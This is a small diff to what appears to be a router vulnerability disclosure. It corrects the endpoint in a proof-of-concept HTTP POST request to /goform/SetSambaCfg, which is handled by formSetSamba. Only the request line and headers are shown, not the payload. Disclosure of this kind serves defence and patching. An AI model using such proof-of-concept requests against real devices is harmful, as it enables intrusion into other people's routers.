@@ -9,7 +9,7 @@ In the /goform/SetSambaCfg back-end handler formSetSamba, the HTTP POST request 
 ![img](./img/SetSambaCfg.png)
 ## Poc
 ```py
-POST /goform/SetOnlineDevName HTTP/1.1
+POST /goform/SetSambaCfg HTTP/1.1
 Host: 192.168.0.1
 Connection: keep-alive
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
